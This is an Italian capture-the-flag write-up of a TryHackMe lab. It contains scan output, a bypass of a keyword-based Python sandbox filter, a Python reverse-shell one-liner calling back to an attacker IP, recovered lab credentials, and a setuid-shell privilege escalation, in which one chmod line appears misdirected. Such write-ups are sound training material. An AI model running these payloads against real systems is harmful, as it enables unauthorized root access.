@@ -1,0 +1,176 @@
+#+TITLE: THM - Python Playground
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** nmap -sC -sV pyground
+  #+begin_example
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-07 07:43 CET
+Nmap scan report for pyground (10.10.150.113)
+Host is up (0.078s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
+|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
+|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
+80/tcp open  http    Node.js Express framework
+|_http-title: Python Playground!
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds
+
+  #+end_example
+
+*** nmap -p- pyground
+  #+begin_example
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-07 07:43 CET
+Stats: 0:02:38 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 37.08% done; ETC: 07:50 (0:04:30 remaining)
+Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 42.54% done; ETC: 07:52 (0:05:17 remaining)
+Nmap scan report for pyground (10.10.150.113)
+Host is up (0.060s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1017.51 seconds
+
+  #+end_example
+
+** gobuster
+
+*** gobuster dir -w ~/repos/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://pyground -x html
+
+    #+begin_example
+/index.html           (Status: 200) [Size: 941]
+/login.html           (Status: 200) [Size: 549]
+/signup.html          (Status: 200) [Size: 549]
+/admin.html           (Status: 200) [Size: 3134]    
+    #+end_example
+** evading python playground firewall
+
+   Analizzando il codice ~/admin.html~ abbiamo trovato la seguente risorsa:
+   
+   #+begin_example
+   http://pyground/super-secret-admin-testing-panel.html
+   #+end_example
+
+   che ci permette di eseguire del codice python.
+
+   -------------------------------------
+   
+   Per evadere il firewall possiamo utilizzare
+   
+   #+begin_example
+   __import__('os')
+   #+end_example
+   
+   questo è possibile in quanto la regola che blocca le richieste è
+   implementata nel seguente modo
+   
+   #+begin_src js
+function isAllowed(code){
+    if(typeof code !== 'string'){
+        return false;
+    }
+    if(code.indexOf('import ') >= 0){
+        return false;
+    }
+    if(code.indexOf('eval') >= 0){
+        return false;
+    }
+    if(code.indexOf('.system') >= 0){
+        return false;
+    }
+    if(code.indexOf('exec') >= 0){
+        return false;
+    }
+
+    return true;
+}   
+   #+end_src
+
+   Che è stata ottenuta nel seguente modo
+   
+   #+begin_src python
+print(__import__('os').listdir('/root/app/'))
+# print(__import__('getpass').getuser())
+with open('/root/app/index.js', 'r') as f:
+    print(f.read())
+   #+end_src
+
+   Per spawnare una reverse invece il payload da utilizzare è
+   
+   #+begin_src python
+socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.16.66",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")   
+   #+end_src
+* PrivEsc
+** credenziali per entrare
+   Possono essere ottenute facendo il reversing delle funzioni
+   javascript presenti nella pagina ~admin.html~.
+   
+   #+begin_src js
+  function int_array_to_string(intArray) {
+      var str = "";
+
+      for(let i = 0; i < intArray.length; i += 2) {
+	const c = intArray[i] * 26 + intArray[i+1];
+	str += String.fromCharCode(c);	
+      }
+      
+      return str;
+    }
+
+    function text_to_int_array(txt) {
+      var intArray = [];
+
+      for(let i = 0; i < txt.length; i++) {
+	intArray.push(txt.charCodeAt(i) - 97)
+      }
+      
+      return intArray;
+    }
+
+const pass = int_array_to_string(text_to_int_array(int_array_to_string(text_to_int_array(hash))))
+
+console.log(pass);
+   #+end_src
+
+   Alla fine otteniamo
+   
+   #+begin_example
+   connor:spaghetti1245
+   #+end_example
+
+** diventare root
+   Per diventare root dobbiamo fare due cose:
+
+   1. Nel docker della macchina, come root, dobbiamo copiare il
+      binario ~/bin/sh~ nella cartella condivisa ~/mnt/log~ e poi mettere
+      al binario il ~setUID bit~.
+      
+      #+begin_src sh
+cp /bin/sh /mnt/log
+chmod +s /bin/sh
+      #+end_src
+
+   2. Ci dobbiamo poi loggare alla macchina utilizzando le credenziali
+      trovate per connor, ovvero ~connor:spaghetti1245~ e una volta
+      entrati dobbiamo eseguire la shell caricata prima
+      
+      #+begin_src sh
+ssh connor@pyground 
+cd /var/log
+./sh -p      
+      #+end_src
+
+   A questo punto siamo effective user ID root e possiamo, ad esempio,
+   aggiungere la nostra chiave al file ~.authorized_keys~ per ottenere
+   user ID root.
